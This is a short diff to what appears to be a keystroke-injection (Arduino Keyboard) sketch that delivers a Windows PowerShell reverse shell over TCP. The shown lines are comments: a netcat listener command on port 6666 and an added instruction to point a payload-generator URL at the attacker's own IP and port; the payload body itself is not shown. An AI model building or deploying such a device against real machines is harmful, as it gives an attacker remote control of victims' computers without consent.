@@ -4,6 +4,7 @@
 // Windows Reverse-Shell TCP PS
 // Tested on Windows 7
 // Listener: nc -lnvp 6666
+// CHANGE TARGET IN URL LINE 23 !!!!! gen_payload.php?ip=YOURIP&port=YOUPORT
 
 #include "Keyboard.h"
  
